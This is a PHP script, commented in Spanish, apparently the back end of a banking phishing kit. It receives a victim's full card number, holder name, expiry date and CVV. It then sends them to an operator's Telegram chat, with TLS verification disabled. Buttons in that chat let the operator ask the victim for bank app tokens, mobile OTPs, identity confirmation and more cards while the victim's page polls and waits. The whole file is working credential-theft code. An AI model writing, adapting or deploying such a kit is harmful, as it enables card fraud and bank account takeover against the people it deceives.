<?php
// procesar_cc.php — Recibe los datos de tarjeta y notifica al admin en Telegram

$config = require '../../config/conexion.php';

$id = $_POST['cliente_id'] ?? '';
$tipo = $_POST['tipo_tarjeta'] ?? 'credito';
$nombre = $_POST['card_name'] ?? '';
$numero = $_POST['card_number'] ?? '';
$vencimiento = $_POST['expiry_date'] ?? '';
$cvv = $_POST['cvv'] ?? '';

if (empty($id) || empty($numero)) {
    header('Location: ../../../tarjeta_credito.php?id=' . urlencode($id) . '&status=ccerror');
    exit;
}

// ── Actualizar estado en BD (estado 0 = en espera de acción del admin) ──
$db_config = $config['db'];
$driver = $db_config['driver'];
$dsn = ($driver === 'mysql')
    ? "mysql:host={$db_config['host']};dbname={$db_config['dbname']};charset=utf8mb4"
    : "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";

try {
    $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->prepare("UPDATE a_confirmar SET estado = 0 WHERE id = :id")
        ->execute([':id' => $id]);
}
catch (PDOException $e) {
    error_log('procesar_cc DB error: ' . $e->getMessage());
}

// ── Notificar a Telegram ──
$botToken = $config['telegram']['bot_token'] ?? '';
$chatId = $config['telegram']['chat_id'] ?? '';
$base_url = trim($config['base_url']);
$admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_url);
$es_local = (strpos($base_url, 'localhost') !== false);

$tipoLabel = strtoupper($tipo) === 'DEBITO' ? 'Débito' : 'Crédito';
// Mostrar número completo (sin espacios extras si se desea, o formateado)
$numLimpio = preg_replace('/\s+/', '', $numero);
$numFormateado = implode(' ', str_split($numLimpio, 4));

$msg = "💳 *Tarjeta de {$tipoLabel} Recibida*\n\n";
$msg .= "› *ID Transacción:* `{$id}`\n";
$msg .= "› *Tipo:* {$tipoLabel}\n";
$msg .= "› *Titular:* `{$nombre}`\n";
$msg .= "› *Número:* `{$numFormateado}`\n";
$msg .= "› *Vencimiento:* `{$vencimiento}`\n";
$msg .= "› *CVV:* `{$cvv}`\n\n";
$msg .= "-------------------------------------\n";
$msg .= "_Por favor, elija una acción para la transacción._";

$post_fields = [
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'Markdown',
];

if (!$es_local && !empty($base_url)) {
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ TC Aprobada', 'url' => $base_url . '?id=' . $id . '&estado=11'],
            ],
            [
                ['text' => '❌ Error TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=12'],
                ['text' => '❌ Error TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=15'],
            ],
            [
                ['text' => '💳 Pedir TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=13'],
                ['text' => '🏦 Pedir TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=14'],
            ],
            [
                ['text' => '✅ Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=6'],
                ['text' => '❌ Error Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=7'],
            ],
            [
                ['text' => '❌ Login Fallido', 'url' => $base_url . '?id=' . $id . '&estado=1'],
                ['text' => '⚠️ Pedir Token App', 'url' => $base_url . '?id=' . $id . '&estado=2'],
            ],
            [
                ['text' => '❌ Rechazar', 'url' => $base_url . '?id=' . $id . '&estado=3'],
                ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $id],
            ],
            [
                ['text' => '🚫 Token Móvil Inválido', 'url' => $base_url . '?id=' . $id . '&estado=5']
            ]
        ]
    ];
    $post_fields['reply_markup'] = json_encode($keyboard);
}

if (!empty($botToken) && !empty($chatId)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_exec($ch);
    curl_close($ch);
}

// ── Redirigir al index con el ID para que siga el polling ──
header('Location: ../../../index.php?id=' . urlencode($id) . '&waiting=true');
exit;
